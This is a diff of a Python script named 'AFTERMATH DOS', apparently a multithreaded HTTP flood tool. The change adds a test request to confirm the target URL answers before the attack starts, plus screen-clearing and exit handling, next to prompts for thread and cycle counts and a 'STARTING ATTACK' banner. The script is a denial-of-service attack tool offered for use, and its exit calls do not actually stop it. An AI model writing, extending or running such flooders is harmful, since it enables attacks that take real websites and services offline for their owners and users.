@@ -1,4 +1,6 @@
-# AFTERMATH DOS - URL VERSION
+# AFTERMATH DOS
+import os
+import platform
 import requests
 from colorama import Fore, init
 import threading
@@ -12,9 +14,18 @@ print(Fore.LIGHTRED_EX + "Threads count(default:256):")
 threads = input(Fore.YELLOW + ">>> ")
 print(Fore.LIGHTRED_EX + "Cycles count(default:20):")
 cycles = input(Fore.YELLOW + ">>> ")
+machine = platform.system()
 
 
 def Menu(thread=threads, cycle=cycles):
+    if machine == "Windows":
+        os.system("cls")
+    elif machine == "Linux":
+        os.system("clear")
+    else:
+        print(Fore.LIGHTRED_EX + "Unsupported platform! Exiting!")
+        os.system('exit')
+
     if thread == "":
         thread = 0
         threads1 = thread + 256
@@ -36,6 +47,15 @@ def Menu(thread=threads, cycle=cycles):
 def threading_start(thread, cycles):
     print(Fore.LIGHTRED_EX + "          STARTING ATTACK")
     print(Fore.LIGHTRED_EX + "=====================================")
+    print(Fore.LIGHTYELLOW_EX + "       SENDING TEST PACKET")
+    t_r = requests.get(url)
+    res = t_r.status_code
+    if res == 200:
+        print(Fore.LIGHTGREEN_EX + "Response: " + str(res))
+    else:
+        print(Fore.LIGHTRED_EX + "Addres not available, exiting!")
+        os.system('exit')
+
     x = 0
     while x <= cycles:
         for i in range(thread):
